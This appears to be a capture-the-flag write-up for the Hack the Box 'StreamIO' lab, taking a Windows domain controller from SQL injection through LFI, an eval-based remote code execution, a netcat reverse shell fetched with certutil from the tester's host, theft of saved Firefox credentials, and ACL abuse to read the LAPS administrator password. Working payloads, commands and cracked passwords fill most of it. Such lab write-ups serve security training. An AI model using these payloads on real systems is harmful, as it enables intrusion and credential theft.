---
title: "Hack the Box - StreamIO"
slug: "hack-the-box-streamio"
date: "2024-03-14"
excerpt: "StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use `WinPEAS` to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the `Core Staff` group, then access LDAP to disclose the administrator LAPS password."
cover: "cover.png"
tags:
  - SQLi
  - LFI
  - LAPS
  - DomainObjectAcl
---

## NMAP
```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt streamio.htb
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-12 11:45:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

Nmap scan contains the `watch` subdomain. We'll add this to our `/etc/hosts
 
![](./20220712144826.png)  

## Website

`https://streamio.htb` is what looks to be an online streaming site.

![](./20220712145114.png)  

There's a `/login.php` page.

![](./20220712145137.png)  

`https://watch.streamio.htb` website contains a form to enter our email to receive updates on new movie arrivals.

![](./20220712145316.png)  

Let's head back to the login form. Let's use Burp to throw some payloads at it to see if it's vulnerable.

## SQLi

To test for SQLi i'm using a time delay. Note that this is a Windows machine so it's most likely using a `MSSQL` database so it will require the correct syntax.

```text
'WAITFOR DELAY '0:0:5'--
```

Looks like the `username` field is injectable. Let's use `sqlmap` to dumb the database and hopefully yield us some credentials.

I've intercepted a login request using `Burp` and will use this for `sqlmap`.

![](./20220712151730.png)  

```bash
sqlmap -r login.req --force-ssl --level 3 --dbs
```

Looks like it's time-based so this will take a while.

![](./20220712152944.png)  

We'll use the `STREAMIO` database since it's most likely to contain the current credentials of users.

```bash
sqlmap -r login.req --force-ssl --level 3 -D STREAMIO --tables --batch
```

![](./20220712153506.png)  

```bash
sqlmap -r login.req --force-ssl --level 3 -D STREAMIO -T users --dump --batch
```

![](./20220713112549.png)  

Now that we have a list of all the users and password hashes, let's crack them and try them against the login form. I did notice that there are two user's who don't seem to fit in with the rest of the usernames: `admin` and `yoshihide`.

## Cracking Hashes

We can use `name-that-hash` to determine the type of hash, although we can probably guess it's `MD5`.

```bash
name-that-hash --text 'b779ba15cedfd22a023c4d8bcf5f2332'
```

![](./20220713112818.png)  

We can use `hashcat` to crack our hashes. First we'll make a list of hashes based on the `csv` outputted by `sqlmap`.

We're using `cut` to split the string via a delimeter of `,` and only grab the hashes. Then `tail` removes the first line which is the header `password` and `sed` removes all the spaces.

```bash
cat users.csv | cut -d "," -f 3 | tail -n +2 | sed 's/ //g' > hashes.out
```

Then we can feed this straight into `hashcat`.

```bash
hashcat -m 0 hashes.out /usr/share/wordlists/rockyou.txt
```

Looks like it got 12 out of the potential 30 passwords.

![](./20220713114017.png)  

If we use the same command and suffix it with `--show` we can view the passwords it cracked and the hash associated with it.

```bash
hashcat -m 0 hashes.out /usr/share/wordlists/rockyou.txt --show
```

```text
3577c47eb1e12c8ba021611e1280753c:highschoolmusical
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
665a50ac9eaa781e4f7f04199db97a11:paddpadd
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

## Directory Fuzzing

I tried `yoshihide:66boysandgirls..` and was able to login. We don't seem to be taken to an authenticated page. I'll fuzz some directories using `gobuster`.

```bash
gobuster dir -k -u https://streamio.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

We are using `-k` to ignore self-signed SSL certificates.

![](./20220713114453.png)  

## Admin Page

The `/admin` directory stands out most, let's check that out.

![](./20220713114521.png)  

I noticed that for each page there is a corresponding query parameter.

![](./20220713114615.png)  

## Parameter Fuzzing

I'll try fuzzing to see if there are any other parameters. We are making authenticated requests so let's grab our `PHPSESSID` cookie and add this to our fuzz requests. We'll just use `gobuster` for this.

I'm using `-c` to add our `PHPSESSID` cookie to authenticate our requests, `?FUZZ=` will replace `FUZZ` with the wordlist item and I'm using `grep -v` to output the inverse to what I've provided which is the length of the response when the parameter doesn't exist.

```bash
gobuster fuzz -k -c 'PHPSESSID=rjf0hjub4buau2t69ec0jtl6de' -u https://streamio.htb/admin/?FUZZ= -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt | grep -v 'Length=1678'
```

![](./20220713123818.png)  

## LFI

We've got a new `debug` parameter. Let's attempt to use LFI against it, and because we're on Windows we can't just use `/etc/passwd` to test, we'll be using:

```text
../../../../../../windows/system32/drivers/etc/hosts
```

![](./20220713124005.png)  

Now that we have LFI lets try exfiltrating the sites `php` files and see if there are any credentials etc. For this we can use a PHP filter.

```
view-source:https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

![](./20220713143441.png)  

```bash
echo 'PD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3N...' | base64 -d > index.php
```

We can open this up in a text editor to review the sites source code.

![](./20220713143719.png)  

First thing we notice are database credentials `db_admin:B1@hx31234567890`. Another thing I noticed were other referenced pages.

![](./20220713144019.png)  

Unfortunately none of these pages include any other page references we can look into. Similar to fuzzing for parameters, we'll do the same thing for files using the `Common-PHP-Filesnames.txt` wordlist for `SecLists`.

## File Fuzzing

```bash
gobuster fuzz -k -c 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' -u https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt | grep -v Length=1712
```

This yields us a `master.php` file which we haven't seen yet.

![](./20220713144933.png)  

## Source Code Analysis

If we review the code we see `eval` being used right at the end of the file.

```php
<?php
  if(isset($_POST['include'])) {
    if($_POST['include'] !== "index.php") {
      eval(file_get_contents($_POST['include']));
    }
  else
    echo(" ---- ERROR ---- ");
  }
?>
```

## Remote Code Execution

After analysing this code snippet we can figure out what it's doing. We need to make a `POST` request with a `php` file in the body of the request with the key of `include` which will then be evaluated and executed. We can `base64` encode `system($_GET['cmd'])` as our page payload. Let's use `curl` to make our request.

```bash
curl -sk -X 'POST' -b 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=ipconfig'
```

![](./20220713150633.png)  

We have remote code execution! Now we just need a shell. First I want to clean up our command so it removes the rest of the HTML and only leaves us our command output.

```bash
curl -sk -X 'POST' -b 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=whoami' | grep '<input name="include" hidden>' -A 1000 | grep '</div>' -B 1000 | tail -n +3 | head -n -1
```

![](./20220713150924.png)  

We'll use `netcat` to get our shell. We need to upload it to the target and then execute a command to get our shell.

```bash
cp /usr/share/windows-binaries/nc.exe nc.exe

python3 -m http.server 80
```

```bash
curl -sk -X 'POST' -b 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=certutil+-urlcache+-split+-f+http://10.10.16.6/nc.exe+c:\windows\temp\nc.exe' | grep '<input name="include" hidden>' -A 1000 | grep '</div>' -B 1000 | tail -n +3 | head -n -1
```

Start our listener.

```bash
rlwrap nc -lnvp 9001
```

Execute `nc.exe 10.10.16.6 9001 powershell.exe` payload via curl command.

```bash
curl -sk -X 'POST' -b 'PHPSESSID=8reabee19cokq4e1nm1s8ellcr' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=c:\windows\temp\nc.exe+10.10.16.6+9001+-e+powershell.exe' | grep '<input name="include" hidden>' -A 1000 | grep '</div>' -B 1000 | tail -n +3 | head -n -1
```

## Low Privilege Shell

Now we have a shell.

![](./20220713213640.png)  

We can run a few commands to start our enumeration of the target.

```powershell
net users
net groups
```

![](./20220713213850.png)  

We can see that there are a three other users, `Martin`, `JDgodd` and `nikki37` that aren't default system users. We can also see that there is an interesting looking user group, `CORE STAFF`.

I also ran a quick `whoami /all` to get more information on our current user.

![](./20220713214056.png)  

Before I continue, I want to upload an additional shell to the `c:\inetpub\streamio.htb` directory so we can more easily spawn a shell if something happens to our current one.

I'm just going to use the following [shell](https://github.com/glowbase/windows-php-shell.git).

```bash
git clone https://github.com/glowbase/windows-php-shell.git
```

Make sure to change the `ip` and `port` values to your own.

![](./20220713214711.png)  

And we'll use `python` and `certutil` to once again upload the shell to the target.

```bash
python3 -m http.server 80

certutil -urlcache -split -f http://10.10.16.6/shell.php shell.php
```

We can execute this shell using `curl`.

```bash
curl -k https://streamio.htb/shell.php
```

## Socks Proxy

If we checkout `Program Files` we see `LAPS` and `Microsoft SQL Server`. Since it looks like the target is running `MSSQL`, let's use [chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.7) to forward port `1433 (MSSQL)`. 

![](./20220714161320.png)  

On our machine:

```bash
chmod +x chisel
./chisel server -p 8000 --reverse
```

On our target:

```powershell
.\chisel.exe client 10.10.16.10:8000 R:socks
```

Before continuing we need to make sure `proxychains` is setup correctly. Edit the `/etc/proxychains4.conf` file and make sure the `[Proxy List]` is changed to the following:

```text
socks5 127.0.0.1 1080
```

## Dump Database

Now to interface with the `MSSQL` database lets use Impacket's `mssqlclient.py`.

```bash
wget https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
```

```bash
proxychains python3 mssqlclient.py 'db_admin:B1@hx31234567890'@127.0.0.1 -port 1433
```

![](./20220714163118.png)  

We can now dump all the users in the database.

```sql
USE streamio_backup;
SELECT * FROM users;
```

![](./20220714163523.png)  

We've got a new user `nikk37` which was in the targets user list.

We could use `hashcat` to crack our hash but we can use a free website called [CrackStation](https://crackstation.net) to quickly find our hash in a rainbow table.

![](./20220714163746.png)  

## Interactive Shell

Now that we have a legitimate users credentials, let's get a proper shell using `evil-winrm`.

```bash
evil-winrm -i streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

![](./20220714164334.png)  

I think we need to pivot to either the `Martin` or `JDgodd` user's but I'm not sure where to move from here. I'm going to enumerate the system more with [WinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20220710).

```bash
# Our machine
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220710/winPEASx64.exe -O winpeas.exe
python3 -m http.server 80

# Target machine
certutil -urlcache -split -f http://10.10.16.10/winpeas.exe winpeas.exe
.\winpeas.exe
```

## Firefox Credentials

One thing in partcular popped out at me. There are `Firefox` credentials.

![](./20220714171729.png)  

To exfiltrate this file from the target let's use SMB. I'll start by setting up a SMB server on our machine and then connect the host to it.

```bash
impacket-smbserver -smb2support kali ./
```

```powershell
net use z: \\10.10.16.10\kali
```

![](./20220714172244.png)  

Now we can copy the file over to our share.

```powershell
cp C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db .\key4.db
cp C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json .\logins.json
```

I'm going to use [firepwd](https://github.com/lclevy/firepwd) to crack the Firefox passwords. Make sure the `key4.db` and `logins.json` files are in the same directory as the `firepwd.py` file when you execute it.

```bash
python3 firepwd.py
```

And we get all the plaintext passwords saved by Firefox.

```text
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

## Password Spraying

Let's create a username and password list and do some password spraying with the credentials we have so far.

```bash
crackmapexec smb streamio.htb -u users.txt -p passwords.txt --continue-on-success | grep -v STATUS_LOGON_FAILURE
```

![](./20220714174559.png)  

We now know the credentials for `JDgodd`.

If we text for `winrm` instead we can see that we aren't able to use `JDgodd:JDg0dd1s@d0p3cr3@t0r` to login.

```bash
crackmapexec winrm streamio.htb -u users.txt -p passwords.txt --continue-on-success | grep -i [+]
```

## Bloodhound

Since we have a user's credentials, we can start off with getting data to load into `Bloodhound` to determine the best path to a more prilvileged user to pivot to.

Add the DC which is the target in our case to `/etc/hosts`. You can check the specific naming of the target using the `hostname` command.

```bash
python3 bloodhound.py -c All -u nikk37 -p 'get_dem_girls2@yahoo.com' -d streamio.htb -dc dc.streamio.htb -ns 10.10.11.158
```

![](./20220714192148.png)  

Once data has been imported, click on `Shortest Path to High Value Targets` in the left query menu.

![](./20220714193203.png)  

Let's focus on `JDgodd`. It looks like they have a direct path to domain admin via the `Core Staff` group. `JDgodd` has `WriteOwner` permission which means they have the ability to modify the owner of the `Core Staff` group. The `Core Staff` group has `LAPSReader` permissions meaning all users can read the password set by LAPS. 

![](./20220714193709.png)  

Let's start off by adding `JDgodd` to the `Core Staff` group. If we right click on the path and select `Help` we can see some abuse information.

![](./20220714194114.png)  

## PowerView

We'll start by uploading [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the target. We can use the SMB share we setup previously.

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

Import the `PowerView` module.

```powershell
cp .\PowerView.ps1 c:\users\nikk37\desktop\PowerView.ps1
Import-Module c:\users\nikk37\desktop\PowerView.ps1
```

Now we need to create a `PSCredential Object` in order to authenticate the subsequent commands.

```powershell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('STREAMIO\JDgodd', $SecPassword)
```

Now we can add `JDgodd` to `Core Staff`. Here you can view more about [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) and [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/).

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity "STREAMIO\JDgodd"
Add-DomainGroupMember -Identity "Core Staff" -Members "STREAMIO\JDgodd" -Credential $Cred
```

We can check if this worked by checking the `Core Staff` group's users using `net groups "Core Staff"`.

![](./20220714195427.png)  

## LAPS

Now we can read the Local Administrator password via LAPS.

```powershell
Get-DomainObject DC -Credential $Cred -Properties name,"ms-mcs-AdmPwd"
```

![](./20220714200515.png)  

## Administrator

We can now login to the target as an Administrator via `evil-winrm`.

```bash
evil-winrm -i streamio.htb -u Administrator -p '6nZy2YVNUO&Zm}'
```

![](./20220714200635.png)  

Finally we can extract the machines hashes.

```bash
impacket-secretsdump 'Administrator:6nZy2YVNUO&Zm}@streamio.htb' -outputfile hashes
```

![](./20220714200955.png)  